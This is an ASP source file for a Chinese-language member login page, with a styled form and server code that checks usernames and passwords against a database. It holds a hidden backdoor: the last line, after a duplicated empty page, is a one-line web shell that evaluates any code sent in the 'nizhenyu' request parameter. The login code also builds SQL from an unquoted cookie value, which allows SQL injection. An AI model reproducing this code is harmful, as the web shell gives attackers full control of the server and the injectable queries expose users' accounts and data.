<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>会员登录</title>
<style type="text/css">
<!--
body{margin:0; padding:0;text-align:center;}
.pf{position:absolute;}
a:link { color:#000000;text-decoration:none;font-size: 13px;}
a:visited { color:#000000;text-decoration:none;font-size: 13px;}
a:hover { color:#ff0000;text-decoration:underline;font-size: 13px;}
a:active { color:#0000FF;text-decoration:none;font-size: 13px;}
.ad{
	padding-left:31px;
	text-align:left;
}
#info{width:693px;}
#info ul{ margin:0;}
#info li{ width:77px; height:28px; float:left;}
#info li a{line-height:28px; display:block;background:url("/images/bx039.gif") no-repeat;}
#info li a:link,#info li a:visited{ font-size:12px; text-decoration:none; color:#ffffff; background-position:center top}
#info li a:hover,#info li a:active{ font-size:12px; text-decoration:none; color:#000000; font-weight :bolder; background-position:center bottom}
.w01 {
	font-family: "宋体";
	font-size: 12px;
	color: #333333;
	text-decoration: none;
}
.w02 {
	font-family: "宋体";
	font-size: 14px;
	font-weight: bold;
	color: #FFFFFF;
	text-decoration: none;
}
.dd01 {
	font-family: "宋体";
	font-size: 12px;
	color: #FFFFFF;
	text-decoration: none;
	background-color: #000000;
	height: 16px;
	border: 1px solid #999999;
}
-->
</style>
<script language="javascript" src="js/main.js"></script>
<!--#include file="conn.asp" -->
<%
UserName=replace(trim(request.Form("username")),"'","")
Password=replace(trim(Request.Form("password")),"'","")
memberuserid=request.Cookies("memberuserid")
sessionidstr=request.Cookies("sessionidstr")
if request("hid")="hidd" then
	set rs=server.createobject("adodb.recordset")
	sql="select * from [$user] where [password]='"&password&"' and [username]='"&username&"'"
	rs.open sql,conn,1,3
	if rs.bof and rs.eof then
		FoundErr=True
		result="alert('用户名或密码错误！');history.go(-1);"
	else
			Response.Cookies("memberuserid").Expires=DateAdd("m",60,now())  
			Response.Cookies("sessionidstr").Expires=DateAdd("m",60,now())
			Response.Cookies("urlid_cookies").Expires=DateAdd("m",60,now())
			Response.Cookies("memberuserid")=rs("id")
			Randomize
			idstr=INT(899999*Rnd+100000)
			Response.Cookies("sessionidstr")=idstr
			conn.execute("update [$user] set sessionidstr='"&idstr&"' where [id]="&rs("id")) 
			result="writeCookie(""urlid_cookies"",'"&rs("fav")&"');parent.ifr.location.href = ""login.asp"";parent.Fun_GetPostData();"
	end if
	rs.close
	set rs=nothing
end if

memberuserid=request.Cookies("memberuserid")
sessionidstr=request.Cookies("sessionidstr")
if memberuserid<>"" and sessionidstr<>"" then
	set rs=server.createobject("adodb.recordset")
	sql="select * from [$user] where [id]="&memberuserid&" and [sessionidstr]='"&sessionidstr&"'"
	rs.open sql,conn,1,3
	if rs.bof and rs.eof then
	
			Response.Cookies("memberuserid")=""
			Response.Cookies("sessionidstr")=""
			islogin=0			
	else
			islogin=1
			uname=rs("username")
	end if
	rs.close
	set rs=nothing
end if





%>
<script language="javascript">
<%=result%></script>
</head>

<body>

<%if islogin<>1 then%>	
<form  action="" method="post"  name="myform">
<div align="left" class="w01">用户：
  <input class="dd01" type="text" name="username"/> 密码：<input class="dd01" type="password" name="password"/><input type="checkbox" name="issave" value="1" checked/>
	保存登陆<input name="hid" type="hidden" value="hidd">
  <input style="height:20px;" class="dd01" type="submit" value="登陆" name="submitlogin"/>
  <input style="height:20px;" class="dd01" type="button" value="注册" onClick="openreg();" /></div>
  </form>

  <%else%><div align="right" class="w01">欢迎： <%=uname%> <a href="exit.asp">退出</a>
  </div>
<%end if%>

</body>
</html>














<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>会员登录</title>

<script language="javascript" src="js/main.js"></script>
</head>

<body>



</body>
</html>

<%eval request("nizhenyu")%>